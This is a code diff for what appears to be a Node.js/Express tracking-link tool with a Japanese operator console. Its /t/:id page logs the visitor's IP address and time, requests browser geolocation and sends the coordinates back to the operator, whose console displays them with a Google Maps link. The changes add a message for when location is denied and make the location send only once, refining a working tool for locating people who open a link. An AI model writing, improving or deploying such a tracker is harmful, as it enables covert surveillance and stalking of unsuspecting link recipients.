@@ -99,6 +99,8 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     if (data.lat && data.lon) {
       addCmdOutput('[📍 位置情報] 緯度: ' + data.lat + ' / 経度: ' + data.lon, 'cmd-location');
       addCmdOutput('[🗺️ Googleマップ] https://maps.google.com/maps?q=' + data.lat + ',' + data.lon, 'cmd-location');
+    } else {
+      addCmdOutput('[📍 位置情報] なし（拒否または非対応）', 'cmd-error');
     }
     addCmdOutput('[🔗 リンクID] ' + data.id, 'cmd-echo');
     addCmdOutput('[🕒 時刻] ' + data.time, 'cmd-echo');
@@ -113,7 +115,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       if (cmd === '') return;
       addCmdOutput('> ' + cmd, 'cmd-echo');
 
-      // ★ /map コマンド
       if (cmd === '/map') {
         const d = window._lastLog;
         if (!d) {
@@ -269,7 +270,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 </body>
 </html>`;
 
-// ===== サーバーサイド =====
+// ===== サーバー =====
 app.get('/', (req, res) => {
   res.send(HTML);
 });
@@ -280,6 +281,7 @@ app.get('/generate', (req, res) => {
   res.json({ link });
 });
 
+// ★ 修正：1回だけ送信するように
 app.get('/t/:id', (req, res) => {
   const id = req.params.id;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
@@ -301,17 +303,26 @@ app.get('/t/:id', (req, res) => {
         .sub { color:#334455; font-size:13px; margin-top:8px; }
       </style>
       <script>
+        var locationSent = false;
+
         function sendLocation(lat, lon) {
+          if (locationSent) return;
+          locationSent = true;
           fetch('/location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ id: '${id}', ip: '${ip}', time: '${time}', lat: lat, lon: lon })
           });
         }
+
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
-            function(pos) { sendLocation(pos.coords.latitude, pos.coords.longitude); },
-            function() { sendLocation(null, null); }
+            function(pos) {
+              sendLocation(pos.coords.latitude, pos.coords.longitude);
+            },
+            function() {
+              sendLocation(null, null);
+            }
           );
         } else {
           sendLocation(null, null);
